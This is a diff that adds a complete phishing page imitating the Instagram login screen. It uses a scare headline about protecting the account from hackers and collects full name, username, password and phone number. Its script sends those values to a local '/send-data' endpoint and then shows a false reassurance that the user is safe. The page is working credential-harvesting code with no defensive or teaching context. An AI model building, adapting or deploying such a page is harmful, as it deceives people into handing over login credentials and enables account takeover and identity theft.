@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #f58529, #dd2a7b, #8134af, #515bd4);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .login-container {
+      background: #fff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+      width: 350px;
+      text-align: center;
+    }
+    .logo {
+      font-family: 'Brush Script MT', cursive;
+      font-size: 36px;
+      color: #dd2a7b;
+      margin-bottom: 10px;
+    }
+    .login-container h1 {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: #dd2a7b;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { color: #dd2a7b; }
+      50% { color: #f58529; }
+      100% { color: #dd2a7b; }
+    }
+    .login-container input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    .login-container button {
+      width: 100%;
+      padding: 12px;
+      background: #dd2a7b;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .login-container button:hover {
+      background: #8134af;
+    }
+    .success-message {
+      display: none;
+      font-size: 16px;
+      color: green;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">Instagram</div>
+    <h1>Log in to safe your account from hackers</h1>
+    <form id="loginForm">
+      <input type="text" id="fullname" placeholder="Full Name" required>
+      <input type="text" id="username" placeholder="Username" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <input type="tel" id="phone" placeholder="Phone Number" required>
+      <button type="submit" id="submitBtn">Log In</button>
+    </form>
+    <div class="success-message" id="successMessage">
+      ✅ You are now safe and officially logged in!
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async function(e){
+      e.preventDefault();
+      
+      const fullname = document.getElementById("fullname").value;
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const phone = document.getElementById("phone").value;
+      const submitBtn = document.getElementById("submitBtn");
+
+      submitBtn.disabled = true;
+      submitBtn.innerText = "Please wait...";
+
+      try {
+        const response = await fetch('http://localhost:3000/send-data', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ fullname, username, password, phone })
+        });
+
+        if (response.ok) {
+          document.getElementById("loginForm").style.display = "none";
+          document.getElementById("successMessage").style.display = "block";
+        } else {
+          alert("Kuch masla ho gaya hai, dobara try karein.");
+          submitBtn.disabled = false;
+          submitBtn.innerText = "Log In";
+        }
+      } catch (error) {
+        console.error("Error:", error);
+        alert("Server connect nahi ho saka!");
+        submitBtn.disabled = false;
+        submitBtn.innerText = "Log In";
+      }
+    });
+  </script>
+</body>
+</html>
